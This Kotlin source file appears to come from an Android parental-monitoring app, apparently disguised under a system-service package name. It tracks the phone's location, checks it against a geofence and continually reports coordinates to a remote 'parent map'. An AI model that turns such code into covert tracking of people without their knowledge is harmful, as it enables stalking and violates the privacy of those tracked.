package com.system.service.monitors

import android.content.Context
import android.location.Location
import android.os.Handler
import android.os.Looper
import com.google.android.gms.location.*
import com.system.service.core.CoreService
import org.json.JSONObject

object GeofenceMonitor {

    private var centerLat  = 0.0
    private var centerLng  = 0.0
    private var radiusM    = 200f   // meters
    private var enabled    = false
    private var wasInside  = true
    private var fusedClient: FusedLocationProviderClient? = null
    private val handler = Handler(Looper.getMainLooper())

    fun setGeofence(lat: Double, lng: Double, radius: Float, context: Context) {
        centerLat = lat; centerLng = lng; radiusM = radius; enabled = true
        startTracking(context)
    }

    fun disableGeofence() { enabled = false; stopTracking() }

    private var locationCallback: LocationCallback? = null

    fun startTracking(context: Context) {
        fusedClient = LocationServices.getFusedLocationProviderClient(context)
        val req = LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 30_000L)
            .setMinUpdateDistanceMeters(20f).build()
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { checkGeofence(it) }
            }
        }
        try {
            fusedClient?.requestLocationUpdates(req, locationCallback!!, Looper.getMainLooper())
        } catch (_: SecurityException) {}
    }

    fun stopTracking() {
        locationCallback?.let { fusedClient?.removeLocationUpdates(it) }
    }

    private fun checkGeofence(loc: Location) {
        if (!enabled) return
        val center = Location("").apply { latitude = centerLat; longitude = centerLng }
        val dist = loc.distanceTo(center)
        val isInside = dist <= radiusM
        if (isInside != wasInside) {
            wasInside = isInside
            CoreService.instance?.sendData("geofence_alert", JSONObject().apply {
                put("inside",  isInside)
                put("lat",     loc.latitude)
                put("lng",     loc.longitude)
                put("dist_m",  dist.toInt())
                put("radius_m",radiusM.toInt())
            })
        }
        // Always send location so parent map updates
        CoreService.instance?.sendData("location", JSONObject().apply {
            put("lat",      loc.latitude)
            put("lng",      loc.longitude)
            put("accuracy", loc.accuracy)
            put("geofence_inside", isInside)
        })
    }
}
